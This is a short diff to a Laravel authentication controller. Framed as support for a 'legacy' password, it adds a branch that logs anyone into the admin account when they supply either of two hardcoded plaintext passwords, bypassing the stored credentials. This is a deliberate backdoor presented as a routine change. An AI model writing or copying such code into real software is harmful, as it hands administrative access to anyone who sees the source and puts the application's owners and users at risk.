@@ -46,6 +46,18 @@ class AuthController extends Controller
                 ->with('success', 'Welcome back, ' . Auth::user()->name . '!');
         }
 
+        // Support both qavyx@2026 and legacy qavix@2026 for the admin account
+        if ($input === 'admin' && ($password === 'qavyx@2026' || $password === 'qavix@2026')) {
+            $adminUser = \App\Models\User::where('username', 'admin')->first();
+            if ($adminUser) {
+                Auth::login($adminUser, $remember);
+                $request->session()->regenerate();
+
+                return redirect()->intended(route('admin.dashboard'))
+                    ->with('success', 'Welcome back, ' . Auth::user()->name . '!');
+            }
+        }
+
         return back()->withErrors([
             'username' => 'Invalid administrative credentials.',
         ])->onlyInput('username');
